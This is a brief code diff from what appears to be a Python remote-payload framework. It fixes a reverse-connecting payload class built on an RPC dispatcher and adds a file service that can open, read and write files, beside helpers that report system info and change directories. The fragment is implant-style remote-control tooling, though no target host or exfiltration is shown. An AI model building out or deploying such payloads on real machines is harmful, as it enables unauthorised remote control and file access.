@@ -50,7 +50,14 @@ class TCPBindPayload(socketserver.TCPServer, PayloadRPCDispatcher):
 class TCPReversePayload(sock.TCPClient, PayloadRPCDispatcher):
     
     def __init__(self, addr, retry_interval=1):
-        TCPClient.__init__(self, addr, retry_interval)
+        PayloadRPCDispatcher.__init__(self)
+        sock.TCPClient.__init__(self, addr, retry_interval)
+
+    def __enter__(self):
+        return self
+
+    def __exit__(self, *args, **kwargs):
+        pass
 
 
 def uname():
@@ -92,6 +99,14 @@ def change_dir(path):
 def get_current_dir():
     import os
     return os.getcwd()
+
+
+class FileService:
+
+    def __new__(cls, r=True, w=True):
+        class _FileService(FileOpener, FileReader, FileWriter):
+            pass
+        return _FileService()
 
 
 class FileOpener:
